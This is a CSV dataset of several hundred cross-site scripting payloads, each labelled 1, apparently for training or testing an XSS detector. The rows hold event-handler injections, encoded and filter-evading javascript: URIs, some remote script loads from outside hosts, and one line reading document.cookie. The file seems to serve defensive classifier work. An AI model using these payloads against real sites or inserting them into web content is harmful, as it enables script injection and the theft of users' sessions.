payload,label
"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",1
<x onmousemove=alert(1)>hover this!,1
"<address onbeforepaste=""alert(1)"" contenteditable>test</address>",1
"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>",1
"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",1
"<dl draggable=""true"" ondragstart=""alert(1)"">test</dl>",1
"<IFRAME SRC=""javascript:document.vulnerable=true;""></iframe>",1
<dt id=x tabindex=1 onactivate=alert(1)></dt>,1
"<form onkeypress=""alert(1)"" contenteditable>test</form>",1
"""`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>",1
"<shadow draggable=""true"" ondragstart=""alert(1)"">test</shadow>",1
"<IMG SRC=x oncanplay=""alert(String.fromCharCode(88,83,83))"">",1
"<script src=""data:\xD4\x8F,javascript:alert(1)""></script>",1
<data id=x tabindex=1 onbeforeactivate=alert(1)></data>,1
<script\x0C>javascript:alert(1)</script>,1
"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationend=""alert(1)""></area>",1
"<plaintext oncut=""alert(1)"" contenteditable>test</plaintext>",1
"<tbody onmousemove=""alert(1)"">test</tbody>",1
"<style>:target {transform: rotate(180deg);}</style><optgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></optgroup>",1
"<link onmousemove=""alert(1)"">test</link>",1
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"";>;",1
"<IMG SRC=""jav	ascript:alert('XSS');"">",1
"<nobr onpaste=""alert(1)"" contenteditable>test</nobr>",1
<nav id=x tabindex=1 ondeactivate=alert(1)></nav><input id=y autofocus>,1
"<style>:target {color:red;}</style><menuitem id=x style=""transition:color 1s"" ontransitionend=alert(1)></menuitem>",1
"<canvas onkeyup=""alert(1)"" contenteditable>test</canvas>",1
&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dd>",1
"<multicol draggable=""true"" ondragend=""alert(1)"">test</multicol>",1
"<audio autoplay controls onseeking=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<frameset oncopy=""alert(1)"" contenteditable>test</frameset>",1
<bdo id=x tabindex=1 onfocus=alert(1)></bdo>,1
"<cite onmousemove=""alert(1)"">test</cite>",1
"<bdi onmousemove=""alert(1)"">test</bdi>",1
"<audio draggable=""true"" ondrag=""alert(1)"">test</audio>",1
"<menuitem onpaste=""alert(1)"" contenteditable>test</menuitem>",1
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",1
"<sub draggable=""true"" ondragstart=""alert(1)"">test</sub>",1
"<pre onmouseenter=""alert(1)"">test</pre>",1
"<center onclick=""alert(1)"">test</center>",1
<script src=%(jscript)s></script>,1
"<div draggable=""true"" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>",1
"<optgroup onmouseout=""alert(1)"">test</optgroup>",1
"<IMG SRC=x onwaiting=""alert(String.fromCharCode(88,83,83))"">",1
"<aside draggable=""true"" ondrag=""alert(1)"">test</aside>",1
"<video id=x controls onfocus=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",1
"<link draggable=""true"" ondrag=""alert(1)"">test</link>",1
"<keygen onkeypress=""alert(1)"" contenteditable>test</keygen>",1
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,1
"<embed ondblclick=""alert(1)"">test</embed>",1
"<ul onkeypress=""alert(1)"" contenteditable>test</ul>",1
"<nextid onmouseout=""alert(1)"">test</nextid>",1
"<video autoplay controls onwaiting=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",1
"<dl draggable=""true"" ondragend=""alert(1)"">test</dl>",1
"<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><col id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></col>",1
"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<s onkeydown=""alert(1)"" contenteditable>test</s>",1
"<style>:target {color: red;}</style><table id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></table>",1
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationstart=""alert(1)""></blockquote>",1
<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>,1
"<acronym onmouseover=""alert(1)"">test</acronym>",1
"'""></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>",1
"ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(1)"">DEF",1
<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,1
<code id=x tabindex=1 onactivate=alert(1)></code>,1
"<style>:target {color:red;}</style><sub id=x style=""transition:color 1s"" ontransitionend=alert(1)></sub>",1
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",1
"<menu draggable=""true"" ondrag=""alert(1)"">test</menu>",1
<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,1
"<thead onmouseover=""alert(1)"">test</thead>",1
&#x03c;,1
"<ul onkeydown=""alert(1)"" contenteditable>test</ul>",1
"<small draggable=""true"" ondragend=""alert(1)"">test</small>",1
&{document.vulnerable=true;};,1
%3cscript%3ealert('XSS')%3c/script%3e,1
"<blockquote ondblclick=""alert(1)"">test</blockquote>",1
"<picture onmouseleave=""alert(1)"">test</picture>",1
"<tt onmouseleave=""alert(1)"">test</tt>",1
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;,1
"<kbd onmouseenter=""alert(1)"">test</kbd>",1
"<style>:target {color: red;}</style><cite id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></cite>",1
<img srcset=validimage.png onload=alert(1)>,1
"<aside onmouseleave=""alert(1)"">test</aside>",1
<x oncopy=alert(1)>copy this!,1
"<style>:target {color:red;}</style><video id=x style=""transition:color 1s"" ontransitionend=alert(1)></video>",1
<link onfocus=alert(1) id=x tabindex=1 style=display:block>,1
"<i ondblclick=""alert(1)"">test</i>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bgsound id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bgsound>",1
"<style>:target {transform: rotate(180deg);}</style><menu id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></menu>",1
<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>,1
<strong id=x tabindex=1 onfocusin=alert(1)></strong>,1
"<marquee draggable=""true"" ondrag=""alert(1)"">test</marquee>",1
"<abbr onmouseup=""alert(1)"">test</abbr>",1
"<isindex onkeyup=""alert(1)"" contenteditable>test</isindex>",1
"<svg oncopy=""alert(1)"" contenteditable>test</svg>",1
"<style>:target {color:red;}</style><rt id=x style=""transition:color 1s"" ontransitionend=alert(1)></rt>",1
"<figure onmouseleave=""alert(1)"">test</figure>",1
"<IMG SRC=""jav ascript:alert('XSS');"">",1
"<style>@keyframes slidein {}</style><tbody style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tbody>",1
"<div draggable=""true"" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable>drop here</dir>",1
"<rt ondblclick=""alert(1)"">test</rt>",1
"<dd onpaste=""alert(1)"" contenteditable>test</dd>",1
"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>",1
"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",1
"<div draggable=""true"" contenteditable>drag me</div><command ondragover=alert(1) contenteditable>drop here</command>",1
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out,1
<command id=x tabindex=1 onfocusin=alert(1)></command>,1
"<picture draggable=""true"" ondragleave=""alert(1)"">test</picture>",1
<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>,1
<nextid id=x tabindex=1 onfocus=alert(1)></nextid>,1
"`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",1
"<head onmouseup=""alert(1)"">test</head>",1
"<thead ondblclick=""alert(1)"">test</thead>",1
<body onfocusout=alert(1) id=x><iframe id=x>,1
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,1
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationstart=""alert(1)""></tbody>",1
"<;A HREF="";//google"";>;XSS<;/A>;",1
"<spacer onmouseout=""alert(1)"">test</spacer>",1
"<style>:target {color: red;}</style><ruby id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ruby>",1
<script>javascript:alert(1)</script\x0B,1
"<style>:target {color: red;}</style><data id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></data>",1
"<fieldset onmouseover=""alert(1)"">test</fieldset>",1
"<style>@keyframes x{}</style><font style=""animation-name:x"" onanimationstart=""alert(1)""></font>",1
"<style>:target {color:red;}</style><figure id=x style=""transition:color 1s"" ontransitionend=alert(1)></figure>",1
"<image onclick=""alert(1)"">test</image>",1
"<slot onmousedown=""alert(1)"">test</slot>",1
<script onload=alert(1) src=validjs.js></script>,1
&#X03c,1
<dd id=x tabindex=1 onfocusin=alert(1)></dd>,1
"<ins ondblclick=""alert(1)"">test</ins>",1
\x3c,1
"<link rel=import href=""data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",1
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",1
"&lt;SCRIPT =\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
"<article onmouseout=""alert(1)"">test</article>",1
"""`'><script>\xE1\x9A\x80javascript:alert(1)</script>",1
"<title onkeydown=""alert(1)"" contenteditable>test</title>",1
<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,1
<textarea onselect=alert(1) autofocus>XSS</textarea>,1
"<br onmouseup=""alert(1)"">test</br>",1
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationstart=""alert(1)""></template>",1
"<;A HREF="";http://1113982867/"";>;XSS<;/A>;",1
"<div draggable=""true"" contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>",1
\'-alert(1)//,1
"<template oncontextmenu=""alert(1)"">test</template>",1
<sup id=x tabindex=1 ondeactivate=alert(1)></sup><input id=y autofocus>,1
<cite id=x tabindex=1 onfocusin=alert(1)></cite>,1
"<a onclick=""alert(1)"">test</a>",1
<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>,1
"<IMG SRC=x ondragleave=""alert(String.fromCharCode(88,83,83))"">",1
"<style>:target {color: red;}</style><xmp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></xmp>",1
"<output draggable=""true"" ondragstart=""alert(1)"">test</output>",1
<frame id=x tabindex=1 onactivate=alert(1)></frame>,1
"<nobr onbeforepaste=""alert(1)"" contenteditable>test</nobr>",1
"<noframes oncontextmenu=""alert(1)"">test</noframes>",1
"<cite onclick=""alert(1)"">test</cite>",1
<img src/onerror=alert(1)>,1
<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>,1
"<code onmousemove=""alert(1)"">test</code>",1
<<SCRIPT>alert(“XSS”);//<</SCRIPT>,1
"<content onmouseout=""alert(1)"">test</content>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></title>",1
"<noframes draggable=""true"" ondragleave=""alert(1)"">test</noframes>",1
<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>,1
<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>,1
"<ins onmouseup=""alert(1)"">test</ins>",1
"<style>@keyframes slidein {}</style><fieldset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></fieldset>",1
"<ruby onbeforecut=""alert(1)"" contenteditable>test</ruby>",1
"<abbr onmouseout=""alert(1)"">test</abbr>",1
"<s onmousemove=""alert(1)"">test</s>",1
<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,1
"<button onmouseenter=""alert(1)"">test</button>",1
<ol id=x tabindex=1 onfocusin=alert(1)></ol>,1
<base href=//0>,1
"<plaintext onmouseover=""alert(1)"">test</plaintext>",1
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onanimationend=""alert(1)""></caption>",1
"<figure onmouseup=""alert(1)"">test</figure>",1
"<ins onbeforepaste=""alert(1)"" contenteditable>test</ins>",1
<ScRiPt>alert(1)</sCriPt>,1
<marquee onstart=alert(1)>,1
&#60,1
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;,1
"<plaintext onbeforepaste=""alert(1)"" contenteditable>test</plaintext>",1
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationend=""alert(1)""></sup>",1
<section id=x tabindex=1 onbeforedeactivate=alert(1)></section><input autofocus>,1
"<area draggable=""true"" ondragend=""alert(1)"">test</area>",1
"<del onbeforecut=""alert(1)"" contenteditable>test</del>",1
<section onblur=alert(1) tabindex=1 id=x></section><input autofocus>,1
<noembed id=x tabindex=1 onfocus=alert(1)></noembed>,1
"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",1
<rb id=x tabindex=1 onactivate=alert(1)></rb>,1
"<style>:target {color: red;}</style><dd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dd>",1
"<iframe style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",1
"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE1\x9A\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>,1
"<strong ondblclick=""alert(1)"">test</strong>",1
<img onblur=alert(1) tabindex=1 id=x></img><input autofocus>,1
"<wbr onbeforepaste=""alert(1)"" contenteditable>test</wbr>",1
<marquee onblur=alert(1) tabindex=1 id=x></marquee><input autofocus>,1
<ruby onfocusout=alert(1) tabindex=1 id=x></ruby><input autofocus>,1
"<output onkeyup=""alert(1)"" contenteditable>test</output>",1
"<script onbeforecopy=""alert(1)"" contenteditable>test</script>",1
<svg><optgroup onload=alert(1)></optgroup>,1
"""><img src=x onerror=javascript:alert(""1"")>",1
"'""></title><script>alert(1111)</script>",1
"<progress onbeforepaste=""alert(1)"" contenteditable>test</progress>",1
"<tt onbeforepaste=""alert(1)"" contenteditable>test</tt>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nextid id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></nextid>",1
&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;,1
"<rb onkeyup=""alert(1)"" contenteditable>test</rb>",1
"<colgroup oncontextmenu=""alert(1)"">test</colgroup>",1
"<sub onmousedown=""alert(1)"">test</sub>",1
"<keygen draggable=""true"" ondrag=""alert(1)"">test</keygen>",1
"<dialog oncut=""alert(1)"" contenteditable>test</dialog>",1
<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;,1
"<meter ondblclick=""alert(1)"">test</meter>",1
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,1
"<style>:target {color: red;}</style><listing id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></listing>",1
"<div draggable=""true"" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>",1
"<sup onmouseleave=""alert(1)"">test</sup>",1
<svg><ins onload=alert(1)></ins>,1
"<area onmouseenter=""alert(1)"">test</area>",1
"<ins onmousedown=""alert(1)"">test</ins>",1
<picture id=x tabindex=1 onfocus=alert(1)></picture>,1
"<style>@keyframes x{}</style><menu style=""animation-name:x"" onanimationstart=""alert(1)""></menu>",1
"&lt;IMG SRC=\""mocha&#58;&#91;code&#93;\""&gt;",1
"<body onkeyup=""alert(1)"" contenteditable>test</body>",1
"<style>:target {color: red;}</style><style id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></style>",1
"<sub onclick=""alert(1)"">test</sub>",1
"<div draggable=""true"" contenteditable>drag me</div><br ondragover=alert(1) contenteditable>drop here</br>",1
"<colgroup oncut=""alert(1)"" contenteditable>test</colgroup>",1
<menu id=x tabindex=1 onfocusin=alert(1)></menu>,1
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",1
"<basefont onkeypress=""alert(1)"" contenteditable>test</basefont>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><content id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></content>",1
"<rp onmousedown=""alert(1)"">test</rp>",1
"<q draggable=""true"" ondragend=""alert(1)"">test</q>",1
"<style>:target {transform: rotate(180deg);}</style><plaintext id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></plaintext>",1
<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>,1
&#x00003C,1
<svg><u onload=alert(1)></u>,1
"<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>",1
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",1
<form><input formaction=javascript:alert(1) type=image src=SOURCE>,1
"<input onbeforecut=alert(1) value=""XSS"" autofocus>",1
"<style>:target {color: red;}</style><summary id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></summary>",1
"<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>",1
"<isindex oncontextmenu=""alert(1)"">test</isindex>",1
<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>,1
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onanimationend=""alert(1)""></dt>",1
"<shadow onbeforecopy=""alert(1)"" contenteditable>test</shadow>",1
' onmouseover=alert(/XSS/),1
"&lt;IMG SRC=\""http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\""&gt;",1
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",1
"<center draggable=""true"" ondragleave=""alert(1)"">test</center>",1
<colgroup id=x tabindex=1 ondeactivate=alert(1)></colgroup><input id=y autofocus>,1
"<style>:target {color: red;}</style><time id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></time>",1
"<tfoot oncut=""alert(1)"" contenteditable>test</tfoot>",1
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,1
<keygen id=x tabindex=1 ondeactivate=alert(1)></keygen><input id=y autofocus>,1
<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>,1
"<div draggable=""true"" contenteditable>drag me</div><caption ondrop=alert(1) contenteditable>drop here</caption>",1
"<body draggable=""true"" ondragstart=""alert(1)"">test</body>",1
<svg><slot onload=alert(1)></slot>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blink id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></blink>",1
"&lt;A HREF=\""javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\""&gt;XSS&lt;/A&gt;",1
"<time oncut=""alert(1)"" contenteditable>test</time>",1
"""`'><script>-javascript:alert(1)</script>",1
"<script>alert(""hellox worldss"")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510",1
"<shadow oncontextmenu=""alert(1)"">test</shadow>",1
"""`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>",1
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?",1
"<data onmouseover=""alert(1)"">test</data>",1
"<style>:target {color: red;}</style><figcaption id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></figcaption>",1
"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<menuitem draggable=""true"" ondragenter=""alert(1)"">test</menuitem>",1
<dt id=x tabindex=1 onfocus=alert(1)></dt>,1
"<frame onmousemove=""alert(1)"">test</frame>",1
"<rb onbeforecopy=""alert(1)"" contenteditable>test</rb>",1
"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",1
<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>,1
"<IMG SRC=x oncuechange=""alert(String.fromCharCode(88,83,83))"">",1
"<fieldset onclick=""alert(1)"">test</fieldset>",1
"<div draggable=""true"" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>",1
"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",1
<head id=x tabindex=1 onbeforedeactivate=alert(1)></head><input autofocus>,1
"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",1
"<summary onbeforepaste=""alert(1)"" contenteditable>test</summary>",1
<ins id=x tabindex=1 onfocusin=alert(1)></ins>,1
"<source draggable=""true"" ondragleave=""alert(1)"">test</source>",1
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationend=""alert(1)""></xmp>",1
"<div draggable=""true"" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>",1
"<style>@keyframes slidein {}</style><cite style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></cite>",1
<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><base ondragover=alert(1) contenteditable>drop here</base>",1
"<spacer ondblclick=""alert(1)"">test</spacer>",1
<content onfocusout=alert(1) tabindex=1 id=x></content><input autofocus>,1
"<input onkeyup=""alert(1)"" contenteditable>test</input>",1
"<keygen onmouseover=""alert(1)"">test</keygen>",1
"<link REL=""stylesheet"" HREF=""javascript:document.vulnerable=true;"">",1
"<menu onbeforecut=""alert(1)"" contenteditable>test</menu>",1
"<slot draggable=""true"" ondragstart=""alert(1)"">test</slot>",1
<%78 onxxx=1,1
"<ul onkeyup=""alert(1)"" contenteditable>test</ul>",1
<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>,1
"<html onbeforepaste=""alert(1)"" contenteditable>test</html>",1
"<style>:target {color: red;}</style><del id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></del>",1
<svg><samp onload=alert(1)></samp>,1
"<div draggable=""true"" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>",1
<img id=x tabindex=1 onfocus=alert(1)></img>,1
"<nav draggable=""true"" ondragstart=""alert(1)"">test</nav>",1
<center id=x tabindex=1 onbeforedeactivate=alert(1)></center><input autofocus>,1
"<code onpaste=""alert(1)"" contenteditable>test</code>",1
"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>",1
"<progress oncontextmenu=""alert(1)"">test</progress>",1
"<dd onmousemove=""alert(1)"">test</dd>",1
"<blink onclick=""alert(1)"">test</blink>",1
"<hr oncut=""alert(1)"" contenteditable>test</hr>",1
"<meta oncopy=""alert(1)"" contenteditable>test</meta>",1
"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>",1
"<meta onkeydown=""alert(1)"" contenteditable>test</meta>",1
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationend=""alert(1)""></sub>",1
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>,1
"<style>@keyframes slidein {}</style><em style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></em>",1
"<object onmousedown=""alert(1)"">test</object>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><svg id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></svg>",1
<meta id=x tabindex=1 onfocusin=alert(1)></meta>,1
"<template onmouseleave=""alert(1)"">test</template>",1
"<bdo onpaste=""alert(1)"" contenteditable>test</bdo>",1
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,1
"<acronym onmouseenter=""alert(1)"">test</acronym>",1
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onanimationstart=""alert(1)""></caption>",1
"<textarea ondblclick=""alert(1)"">test</textarea>",1
"<dialog onmouseleave=""alert(1)"">test</dialog>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></select>",1
"<style>:target {color:red;}</style><dl id=x style=""transition:color 1s"" ontransitionend=alert(1)></dl>",1
&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;,1
<x%0Donxxx=1,1
"<acronym oncopy=""alert(1)"" contenteditable>test</acronym>",1
"<blockquote onmousedown=""alert(1)"">test</blockquote>",1
"<dir draggable=""true"" ondrag=""alert(1)"">test</dir>",1
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />,1
"<slot onmousemove=""alert(1)"">test</slot>",1
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationstart=""alert(1)""></em>",1
<frame id=x tabindex=1 onbeforedeactivate=alert(1)></frame><input autofocus>,1
<img src=xss onerror=alert(1)>,1
"<IMG SRC=x ondurationchange=""alert(String.fromCharCode(88,83,83))"">",1
<meta id=x tabindex=1 onactivate=alert(1)></meta>,1
"""`'><script>\xE2\x80\x80javascript:alert(1)</script>",1
“><ScRiPt>alert(document.cookie)</script>,1
